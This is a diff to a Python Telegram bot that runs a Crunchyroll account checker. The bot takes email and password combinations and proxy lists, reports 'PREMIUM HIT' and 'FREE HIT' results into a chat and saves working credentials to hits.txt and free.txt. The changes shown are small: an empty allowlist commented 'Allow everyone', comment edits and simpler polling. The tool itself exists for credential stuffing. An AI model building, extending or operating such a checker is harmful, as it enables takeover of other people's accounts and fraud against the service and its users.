@@ -5,9 +5,11 @@ import random
 import requests
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
+from aiogram.types import FSInputFile
 from aiogram import F
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
+AUTHORIZED_USERS = []  # Allow everyone
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
@@ -190,10 +192,12 @@ CHECKED BY: @Cr_chker001_bot
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
         with open("hits.txt", "a", encoding="utf-8") as f:
             f.write(capture + "\n")
+
     elif result['status'] == 'FREE':
         await bot.send_message(chat_id, f"<b>🆓 FREE HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
-        with open("free.txt", "a", encoding="utf-8") as f:
+        with open("free.txt", "a", encoding="utf-8") as f:   # also saves free accounts
             f.write(capture + "\n")
+
     else:
         await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
 
@@ -222,7 +226,7 @@ async def proxies_cmd(message: types.Message):
 async def handle(message: types.Message):
     global checker
 
-    # Proxy loading
+    # Proxy loading - ONLY when /proxies command is used
     if message.text and message.text.startswith("/proxies"):
         if message.document:
             file = await bot.get_file(message.document.file_id)
@@ -284,13 +288,7 @@ async def main():
     global checker
     checker = CrunchyrollChecker(proxies)
     print("✅ Bot started")
-
-    while True:
-        try:
-            await dp.start_polling(bot, skip_updates=True)
-        except Exception as e:
-            print(f"Polling stopped: {e}. Restarting in 5 seconds...")
-            await asyncio.sleep(5)
+    await dp.start_polling(bot)
 
 
 if __name__ == "__main__":
